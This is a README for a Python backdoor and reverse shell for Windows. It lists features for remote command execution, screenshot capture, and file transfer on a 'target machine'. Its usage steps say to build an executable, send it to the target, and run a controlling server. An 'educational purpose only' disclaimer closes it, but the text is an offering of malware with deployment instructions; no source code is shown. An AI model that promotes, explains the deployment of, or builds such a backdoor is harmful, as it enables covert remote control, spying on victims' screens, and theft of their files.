# Python-Backdoor-Windows
This a simple python backdoor/reverse shell for Windows. It contains a lot of features including executing all windows commands, taking screenshot of target machine, etc.

## Installation

* Python 3.6+
* Windows Machine

1. Download the repo via github or git --> `git clone https://github.com/vishnuz1611/Python-Backdoor-Windows.git`
2. Install the requirements --> `pip install -r requirements.txt`

## Features

* Executing all Windows commands (eg: ipconfig, dir, cd, & many more)
* Capturing Screenshot of target system
* Upload files to target machine
* Download files from the target machine

## Usage

1. Run `src/setup.py` file to configure the client and server files.
2. You will find the executable in the `dist` folder. Send it to the target machine.
3. Run `src/server.py` on the host machine.

## Help

Run the `help` command to find relevant commands to execute on target machine.

## Disclaimer

This program is to be used for educational purpose only. I take no responsibility or liability for own personal use.
